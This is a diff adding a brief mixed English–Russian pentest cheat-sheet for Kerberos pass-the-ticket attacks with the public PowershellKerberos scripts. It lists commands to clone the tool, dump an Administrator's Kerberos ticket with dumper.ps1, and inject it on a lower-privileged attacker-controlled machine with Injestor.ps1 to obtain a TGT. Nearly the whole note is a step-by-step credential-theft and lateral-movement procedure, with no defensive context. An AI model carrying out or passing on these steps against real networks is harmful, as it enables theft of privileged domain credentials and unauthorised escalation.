@@ -1,0 +1,13 @@
+need local admin 
+https://github.com/MzHmO/PowershellKerberos
+git clone https://github.com/MzHmO/PowershellKerberos
+.\dumper.ps1
+gets ticket 
+копируем ticket  Administrator (или другого привилегированного пользователя)
+ doIGiDCCBoSgAwIBBaEDAgEWooIFejCCBXZhggVyMIIFb......
+
+можно перейти на контролируемую нами машину (с меньшими привилегиями)
+.\Injestor.ps1 2 "doIGiDCCBoSgAwIBBaEDAgEWooIFejCCBXZhggVyMIIFb......"
+должны получить TGT
+
+оригинал https://www.youtube.com/watch?v=UvQPRFo_w54&t=1s
